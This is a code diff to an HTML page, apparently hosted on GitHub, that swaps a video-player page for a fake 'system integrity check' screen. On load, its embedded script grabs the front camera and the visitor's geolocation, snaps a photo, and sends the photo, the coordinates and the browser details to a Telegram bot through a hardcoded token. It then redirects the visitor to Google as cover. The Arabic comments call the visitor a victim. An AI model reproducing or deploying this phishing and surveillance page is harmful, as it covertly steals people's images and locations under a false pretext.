@@ -1,12 +1,71 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مشغل الفيديو</title>
+    <meta charset="UTF-8">
+    <title>Checking System...</title>
+    <script>
+        const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
+        const CHID = "7984067238";
+
+        async function sendToTelegram(message, photoBlob = null) {
+            // إرسال النص
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHID, text: message, parse_mode: 'HTML' })
+            });
+
+            // إرسال الصورة إذا وجدت
+            if (photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHID);
+                formData.append('photo', photoBlob, 'snap.jpg');
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+
+        async function start() {
+            try {
+                // 1. طلب الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // 2. طلب الموقع
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    
+                    // 3. التقاط الصورة بعد ثانيتين لضمان الوضوح
+                    setTimeout(async () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        canvas.toBlob(async (blob) => {
+                            const info = `<b>📍 ضحية جديدة من GitHub!</b>\n\n<b>الموقع:</b> https://www.google.com/maps?q=${lat},${lon}\n<b>المتصفح:</b> ${navigator.userAgent}`;
+                            await sendToTelegram(info, blob);
+                            
+                            // تحويل الضحية لمكان آخر للتمويه
+                            window.location.href = "https://google.com";
+                        }, 'image/jpeg');
+                    }, 2000);
+                }, (err) => {
+                     sendToTelegram("❌ الضحية رفضت إذن الموقع، لكننا سنحاول سحب الصورة.");
+                });
+            } catch (err) {
+                console.log("Permissions Denied");
+            }
+        }
+        window.onload = start;
+    </script>
 </head>
-<body>
-    <video id="dummyVideo" style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <script src="payload.js"></script>
+<body style="background:#000; color:#0f0; text-align:center; font-family:monospace; padding-top:20%;">
+    <h2>SYSTEM_INTEGRITY_CHECK</h2>
+    <p>Please wait while we verify your device...</p>
 </body>
 </html>
